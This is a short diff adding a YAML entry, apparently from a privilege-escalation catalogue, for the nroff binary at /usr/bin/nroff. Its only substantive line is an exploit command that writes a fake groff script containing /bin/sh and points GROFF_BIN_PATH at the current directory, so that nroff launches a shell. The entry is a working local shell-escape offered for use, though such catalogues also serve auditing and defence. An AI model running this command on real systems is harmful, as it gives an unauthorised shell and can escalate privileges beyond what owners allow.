@@ -1,0 +1,4 @@
+name: nroff
+binary_path: /usr/bin/nroff
+exploit_cmds:
+- echo /bin/sh >groff && chmod +x groff && GROFF_BIN_PATH=. /usr/bin/nroff
